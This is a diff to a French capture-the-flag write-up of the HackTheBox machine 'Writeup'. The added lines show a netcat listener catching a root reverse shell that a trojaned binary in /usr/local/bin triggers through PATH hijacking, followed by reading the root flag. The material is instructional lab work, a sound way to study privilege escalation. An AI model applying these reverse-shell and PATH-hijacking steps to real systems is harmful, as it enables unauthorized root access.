@@ -781,15 +781,25 @@ Si la synchronisation est correcte :
 - Le binaire piégé dans `/usr/local/bin` est exécuté
 - Un **reverse shell root** arrive dans la **fenêtre 1**
 
-Vérifie immédiatement :
+Vérifie avec `whoami` :
 
-```
+```bash
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB]
+└─$ nc -lvnp 4444      
+
+listening on [any] 4444 ...
+connect to [10.10.17.246] from (UNKNOWN) [10.129.49.2] 42754
+bash: cannot set terminal process group (3271): Inappropriate ioctl for device
+bash: no job control in this shell
+root@writeup:/# whoami
 whoami
+root
+
 ```
 
 Tu dois obtenir :
 
-```
+```txt
 root
 ```
 
@@ -797,9 +807,14 @@ root
 
 Récupère le flag final :
 
-```
+```bash
+root@writeup:/# cat /root/root.txt
 cat /root/root.txt
+6327xxxxxxxxxxxxxxxxxxxxxxxxf1a8
+root@writeup:/#
 ```
+
+Je te laisse le plaisir d’explorer et de mettre en œuvre les autres pistes de détournement de PATH évoquées plus haut, l’objectif ici étant surtout de t’avoir montré une méthode fiable et reproductible pour gérer un contexte contraint par le temps.
 
 ## Conclusion
 
